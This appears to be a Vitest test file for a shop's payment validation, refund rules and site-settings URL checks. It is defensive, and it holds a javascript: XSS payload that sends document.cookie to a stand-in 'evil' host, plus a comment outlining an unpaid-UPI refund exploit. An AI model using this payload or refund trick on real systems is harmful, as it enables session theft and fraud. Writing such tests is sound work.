import { describe, it, expect } from "vitest";
import { isRefundable } from "./payments";
import { paymentMethodSchema } from "./validations/checkout";
import { siteSettingsSchema } from "./validations/site-settings";

describe("payment method is not the customer's to invent", () => {
  it("accepts only the two methods the shop actually supports", () => {
    expect(paymentMethodSchema.safeParse("COD").success).toBe(true);
    expect(paymentMethodSchema.safeParse("UPI").success).toBe(true);
  });

  it("rejects anything else, which is how a free order used to be minted", () => {
    // placeOrder wrote this straight onto the order, and the cancel paths then
    // read it back as proof of payment.
    for (const bogus of ["FREE_MONEY", "RAZORPAY", "cod", "upi", "", "  UPI  "]) {
      expect(paymentMethodSchema.safeParse(bogus).success).toBe(false);
    }
  });
});

describe("a refund needs money to have arrived first", () => {
  it("only PAID is refundable", () => {
    expect(isRefundable("PAID")).toBe(true);
  });

  it("an unpaid COD order owes nothing when cancelled", () => {
    expect(isRefundable("UNPAID")).toBe(false);
  });

  it("a self-declared UPI payment is not money until staff confirm it", () => {
    // The whole exploit: place a UPI order, pay nothing, cancel, collect.
    expect(isRefundable("AWAITING_VERIFICATION")).toBe(false);
  });
});

/** The fields below are rendered into href / next-image on every page. */
function settingsWith(overrides: Record<string, unknown>) {
  return siteSettingsSchema.safeParse({
    heroHeadline: "Handmade furniture",
    heroSubtext: "Built in Andhra Pradesh",
    brandLabel: "MAA",
    brandHeadline: "Our workshop",
    statYearsExperience: 10,
    statProjectsDelivered: 100,
    statHappyFamilies: 100,
    showroomAddress: "Somewhere",
    showroomHours: "9 to 6",
    deliveryMessage: "Andhra Pradesh only",
    gstRate: "18",
    deliveryFee: "0",
    ...overrides,
  });
}

describe("settings URLs are rendered, so they are validated", () => {
  it("takes a normal https link", () => {
    expect(settingsWith({ instagramUrl: "https://instagram.com/maa" }).success).toBe(true);
  });

  it("still allows the fields to be left blank", () => {
    expect(settingsWith({ instagramUrl: "", mapsUrl: "", heroImageUrl: "" }).success).toBe(true);
  });

  it("refuses javascript: — a MANAGER could otherwise XSS the OWNER", () => {
    expect(
      settingsWith({ instagramUrl: "javascript:fetch('//evil/'+document.cookie)" }).success
    ).toBe(false);
    expect(settingsWith({ mapsUrl: "javascript:alert(1)" }).success).toBe(false);
  });

  it("refuses plain http and garbage", () => {
    expect(settingsWith({ facebookUrl: "http://facebook.com/maa" }).success).toBe(false);
    expect(settingsWith({ mapsUrl: "not a url" }).success).toBe(false);
  });

  it("images must be Cloudinary — next.config.ts allows no other host", () => {
    expect(
      settingsWith({ heroImageUrl: "https://res.cloudinary.com/demo/image/upload/v1/a.jpg" })
        .success
    ).toBe(true);
    expect(settingsWith({ heroImageUrl: "https://evil.example.com/a.jpg" }).success).toBe(false);
    expect(settingsWith({ upiQrImage: "https://images.unsplash.com/photo-1" }).success).toBe(false);
  });
});
